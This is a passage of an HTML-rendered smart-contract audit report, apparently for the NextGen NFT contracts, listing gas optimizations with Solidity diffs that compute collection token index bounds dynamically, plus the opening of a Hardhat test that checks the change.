6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th>ID</th>\n<th>Optimization</th>\n<th>Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G-01]</td>\n<td>Derive min / max collection bounds dynamically</td>\n<td>54,522</td>\n</tr>\n<tr>\n<td>[G-02]</td>\n<td>Remove redundant flag for creation of collection</td>\n<td>34,044</td>\n</tr>\n<tr>\n<td>[G-03]</td>\n<td>Remove duplicate reference to core contract</td>\n<td>28,517</td>\n</tr>\n<tr>\n<td>[G-04]</td>\n<td>Remove duplicate reference to randomizer contract</td>\n<td>22,761</td>\n</tr>\n<tr>\n<td>[G-05]</td>\n<td>Remove redundant external call during airdrop</td>\n<td>3066</td>\n</tr>\n<tr>\n<td>[G-06]</td>\n<td>Optimise creation of collection</td>\n<td>976</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-01-derive-min--max-collection-bounds-dynamically\" style=\"position:relative;\"><a href=\"#g-01-derive-min--max-collection-bounds-dynamically\" aria-label=\"g 01 derive min  max collection bounds dynamically permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Derive min / max collection bounds dynamically</h2>\n<p><strong>54,522 gas can be saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenCore:setCollectionData()</code></td>\n<td>199090</td>\n<td>154389</td>\n<td>44701</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:burn()</code></td>\n<td>84270</td>\n<td>83948</td>\n<td>322</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:setFinalSupply()</code></td>\n<td>54949</td>\n<td>49590</td>\n<td>5359</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:mint()</code></td>\n<td>529382</td>\n<td>525242</td>\n<td>4140</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<p>Token min / max index define the valid range of tokens within a collection. There is no need to store them in state variables, as these can be derived using <code>collectionID</code> and <code>collectionTotalSupply</code> and their values can be read using the getter functions wherever required.</p>\n<h3 id=\"recommendation-18\" style=\"position:relative;\"><a href=\"#recommendation-18\" aria-label=\"recommendation 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p><strong>STEP 1:</strong>  Update the getter functions:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function viewTokensIndexMin(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       return(collectionAdditionalData[_collectionID].reservedMinTokensIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return _collectionID * 10000000000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L383-L385\">Source: smart-contracts/NextGenCore.sol#L383-L385</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function viewTokensIndexMax(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       return(collectionAdditionalData[_collectionID].reservedMaxTokensIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       return _collectionID * 10000000000 + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L389-L391\">Source: smart-contracts/NextGenCore.sol#L389-L391</a></p>\n<p><strong>STEP 2:</strong> Remove declaration:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    struct collectionAdditonalDataStructure {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address collectionArtistAddress;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 maxCollectionPurchases;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 collectionCirculationSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 collectionTotalSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 reservedMinTokensIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 reservedMaxTokensIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint setFinalSupplyTimeAfterMint;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address randomizerContract;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        IRandomizer randomizer;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L44-L54\">Source: smart-contracts/NextGenCore.sol#L44-L54</a></p>\n<p><strong>STEP 3:</strong> Remove assignment:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function setCollectionData(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            wereDataAdded[_collectionID] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L147-L166\">Source: smart-contracts/NextGenCore.sol#L147-L166</a></p>\n<p><strong>STEP 4:</strong> Read value via getter:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function burn(uint256 _collectionID, uint256 _tokenId) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require ((_tokenId &gt;= collectionAdditionalData[_collectionID].reservedMinTokensIndex) &amp;&amp; (_tokenId &lt;= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), &quot;id err&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require ((_tokenId &gt;= this.viewTokensIndexMin(_collectionID)) &amp;&amp; (_tokenId &lt;=  this.viewTokensIndexMax(_collectionID)), &quot;id err&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L204-L209\">Source: smart-contracts/NextGenCore.sol#L204-L209</a></p>\n<p><strong>STEP 5:</strong> Since max value is calculated dynamically, no need to update it on supply change:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function setFinalSupply(...) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L307-L311\">Source: smart-contracts/NextGenCore.sol#L307-L311</a></p>\n<p><strong>STEP 6:</strong> Fetch via  value via getter:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function getTokenName(...)  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       uint256 tok = tokenId - collectionAdditionalData[tokenIdsToCollectionIds[tokenId]].reservedMinTokensIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint256 tok = tokenId - this.viewTokensIndexMin(tokenIdsToCollectionIds[tokenId]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        __SNIP__</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L361-L364\">Source: smart-contracts/NextGenCore.sol#L361-L364</a></p>\n<h3 id=\"poc-5\" style=\"position:relative;\"><a href=\"#poc-5\" aria-label=\"poc 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<p><img src=\"https://i.imgur.com/3nYU2eN.png\" alt=\"Test Result\"></p>\n<h3 id=\"poc-test-file\" style=\"position:relative;\"><a href=\"#poc-test-file\" aria-label=\"poc test file permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC test file</h3>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">loadFixture</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">time</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;@nomicfoundation/hardhat-toolbox/network-helpers&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;chai&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;../scripts/fixturesDeployment.js&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_TOTAL_SUPPLY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10_000_000_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Verify removal of min/max params from storage&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ({ </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">loadFixture</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD deploy contracts&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD create a collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;TestCollection&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD successfully set min / max params for a collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SUPPLY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">50</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">SUPPLY</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span 